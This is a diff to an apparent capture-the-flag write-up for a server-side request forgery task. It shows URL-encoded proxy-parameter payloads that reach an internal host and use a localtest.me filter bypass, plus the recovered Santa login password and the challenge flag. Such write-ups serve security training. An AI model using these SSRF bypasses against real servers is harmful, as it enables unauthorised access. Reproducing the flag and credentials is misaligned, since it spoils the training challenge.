@@ -24,17 +24,17 @@ Note that while the example of SSRF used in this task is effectively a Remote Fi
 
 {% embed url="https://meyerweb.com/eric/tools/dencoder/" %}
 
-![](../.gitbook/assets/image%20%28162%29.png)
+![](../.gitbook/assets/image%20%28163%29.png)
 
 > http://10.10.129.132/?proxy=http://list.hohoho:8080/search.php?name=Shell5
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F
 
-![](../.gitbook/assets/image%20%28173%29.png)
+![](../.gitbook/assets/image%20%28174%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
 
-![](../.gitbook/assets/image%20%28191%29.png)
+![](../.gitbook/assets/image%20%28192%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
 
@@ -46,17 +46,23 @@ Note that while the example of SSRF used in this task is effectively a Remote Fi
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho.localtest.me
 
-![](../.gitbook/assets/image%20%28177%29.png)
-
-![](../.gitbook/assets/image%20%28174%29.png)
+![](../.gitbook/assets/image%20%28178%29.png)
 
 {% hint style="success" %}
-
+> Be good for goodness sake!
 {% endhint %}
 
 ### What is the challenge flag?
 
-{% hint style="success" %}
+![](../.gitbook/assets/image%20%28175%29.png)
 
+> Login: Santa
+>
+> Password: Be good for goodness sake!
+
+![](../.gitbook/assets/image%20%28156%29.png)
+
+{% hint style="success" %}
+THM{EVERYONE\_GETS\_PRESENTS}
 {% endhint %}
 
